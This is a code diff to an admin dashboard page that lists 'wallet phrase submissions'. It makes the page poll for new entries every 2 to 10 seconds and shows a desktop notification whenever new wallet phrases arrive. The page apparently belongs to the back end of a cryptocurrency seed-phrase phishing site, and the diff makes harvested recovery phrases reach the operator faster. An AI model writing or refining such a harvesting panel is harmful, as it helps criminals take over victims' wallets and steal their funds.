@@ -15,27 +15,43 @@ export default function AdminPage() {
   const { isDark, toggleTheme } = useTheme()
 
   useEffect(() => {
+    // Request notification permission
+    if (typeof window !== 'undefined' && 'Notification' in window) {
+      if (Notification.permission === 'default') {
+        Notification.requestPermission()
+      }
+    }
+    
+    // Initial fetch
     fetchSubmissions()
     
-    // Auto-refresh every 25 seconds to catch new submissions
+    // Force refresh every 10 seconds (more aggressive)
     const interval = setInterval(() => {
-      console.log('Auto-refreshing submissions every 25 seconds...')
+      console.log('🔄 Force refreshing submissions every 10 seconds...')
       fetchSubmissions()
-    }, 25000)
+    }, 10000)
     
     // Countdown timer for next refresh
     const countdownInterval = setInterval(() => {
       setNextRefreshIn(prev => {
         if (prev <= 1) {
-          return 25
+          return 10
         }
         return prev - 1
       })
     }, 1000)
     
+    // WebSocket-like approach: Check for new submissions every 2 seconds
+    const quickCheckInterval = setInterval(() => {
+      if (!isRefreshing) {
+        quickCheckForNewSubmissions()
+      }
+    }, 2000)
+    
     return () => {
       clearInterval(interval)
       clearInterval(countdownInterval)
+      clearInterval(quickCheckInterval)
     }
   }, [])
 
@@ -107,6 +123,58 @@ export default function AdminPage() {
     } finally {
       setLoading(false)
       setIsRefreshing(false)
+    }
+  }
+
+  // Quick check for new submissions without full refresh
+  const quickCheckForNewSubmissions = async () => {
+    try {
+      // Only check if we have existing submissions
+      if (submissions.length === 0) return
+      
+      // Get the latest submission ID we know about
+      const latestKnownId = Math.max(...submissions.map(s => s.id))
+      
+      console.log('🔍 Quick checking for new submissions after ID:', latestKnownId)
+      
+      const response = await fetch(`/api/submissions/check-new?since=${latestKnownId}&t=${Date.now()}`, {
+        method: 'GET',
+        headers: {
+          'Cache-Control': 'no-cache',
+          'Pragma': 'no-cache'
+        }
+      })
+      
+      if (response.ok) {
+        const data = await response.json()
+        
+        if (data.newSubmissions && data.newSubmissions.length > 0) {
+          console.log('🆕 Found new submissions:', data.newSubmissions.length)
+          
+          // Add new submissions to the beginning of the list
+          setSubmissions(prev => {
+            const newList = [...data.newSubmissions, ...prev]
+            // Remove duplicates based on ID
+            const uniqueList = newList.filter((item, index, self) => 
+              index === self.findIndex(t => t.id === item.id)
+            )
+            return uniqueList
+          })
+          
+          setLastRefreshed(new Date())
+          
+          // Show notification
+          if (typeof window !== 'undefined' && 'Notification' in window && Notification.permission === 'granted') {
+            new Notification('New Submission!', {
+              body: `${data.newSubmissions.length} new wallet phrase(s) submitted`,
+              icon: '/favicon.ico'
+            })
+          }
+        }
+      }
+    } catch (error) {
+      console.error('⚠️ Quick check failed:', error)
+      // Don't show error for quick checks, just log it
     }
   }
 
@@ -278,15 +346,22 @@ export default function AdminPage() {
         <div className="bg-white dark:bg-gray-800 rounded-lg shadow-md dark:shadow-xl p-6 mb-6 transition-colors duration-300">
           <div className="flex items-center justify-between mb-4">
             <div>
-              <h1 className="text-3xl font-bold text-gray-900 dark:text-white transition-colors duration-300">🔐 Admin Dashboard</h1>
-              <p className="text-gray-600 dark:text-gray-300 transition-colors duration-300">View all wallet phrase submissions</p>
+              <div className="flex items-center space-x-3 mb-2">
+                <h1 className="text-3xl font-bold text-gray-900 dark:text-white transition-colors duration-300">🔐 Admin Dashboard</h1>
+                <div className="flex items-center space-x-2 px-3 py-1 bg-green-100 dark:bg-green-900/20 text-green-700 dark:text-green-300 rounded-full text-sm font-medium">
+                  <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
+                  <span>LIVE MODE</span>
+                </div>
+              </div>
+              <p className="text-gray-600 dark:text-gray-300 transition-colors duration-300">View all wallet phrase submissions in real-time</p>
               <div className="flex items-center space-x-4 mt-2 text-sm text-gray-500 dark:text-gray-400">
                 <span>📊 Total Submissions: {submissions.length}</span>
                 {lastRefreshed && (
                   <span>🕒 Last Updated: {lastRefreshed.toLocaleTimeString()}</span>
                 )}
-                <span className="text-blue-600">🔄 Auto-refresh: Every 25s</span>
+                <span className="text-blue-600">🔄 Auto-refresh: Every 10s</span>
                 <span className="text-green-600">⏱️ Next refresh in: {nextRefreshIn}s</span>
+                <span className="text-purple-600">🔍 Quick check: Every 2s</span>
               </div>
             </div>
             <div className="flex space-x-3">
@@ -297,13 +372,24 @@ export default function AdminPage() {
                     ? 'bg-blue-400 cursor-not-allowed' 
                     : 'bg-blue-600 hover:bg-blue-700'
                 }`}
-                title="Refresh submissions"
+                title="Force refresh all submissions"
                 disabled={isRefreshing}
               >
                 <svg className={`w-4 h-4 ${isRefreshing ? 'animate-spin' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
                   <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                 </svg>
-                <span>{isRefreshing ? 'Refreshing...' : 'Refresh Now'}</span>
+                <span>{isRefreshing ? 'Refreshing...' : 'Force Refresh'}</span>
+              </button>
+              
+              <button
+                onClick={quickCheckForNewSubmissions}
+                className="px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors flex items-center space-x-2"
+                title="Quick check for new submissions"
+              >
+                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
+                </svg>
+                <span>Quick Check</span>
               </button>
               <button
                 onClick={handleThemeToggle}
@@ -358,7 +444,7 @@ export default function AdminPage() {
           
           {/* Debug Panel */}
           <div className="bg-gray-50 dark:bg-gray-700 p-4 border-t border-gray-200 dark:border-gray-600">
-            <h3 className="text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">Debug Information</h3>
+            <h3 className="text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">Real-Time Status</h3>
             <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-xs text-gray-600 dark:text-gray-400">
               <div>
                 <span className="font-medium">API Status:</span> 
@@ -376,11 +462,25 @@ export default function AdminPage() {
               </div>
               <div>
                 <span className="font-medium">Auto-refresh:</span> 
-                <span className="ml-1 text-green-500">🔄 Active (25s)</span>
+                <span className="ml-1 text-green-500">🔄 Active (10s)</span>
               </div>
               <div>
                 <span className="font-medium">Next Refresh:</span> 
                 <span className="ml-1 text-orange-500">⏱️ {nextRefreshIn}s</span>
+              </div>
+              <div>
+                <span className="font-medium">Quick Check:</span> 
+                <span className="ml-1 text-purple-500">🔍 Active (2s)</span>
+              </div>
+              <div>
+                <span className="font-medium">Notifications:</span> 
+                <span className={`ml-1 ${typeof window !== 'undefined' && 'Notification' in window && Notification.permission === 'granted' ? 'text-green-500' : 'text-yellow-500'}`}>
+                  {typeof window !== 'undefined' && 'Notification' in window && Notification.permission === 'granted' ? '✅ Enabled' : '⚠️ Disabled'}
+                </span>
+              </div>
+              <div>
+                <span className="font-medium">Connection:</span> 
+                <span className="ml-1 text-blue-500">🟢 Live</span>
               </div>
             </div>
           </div>
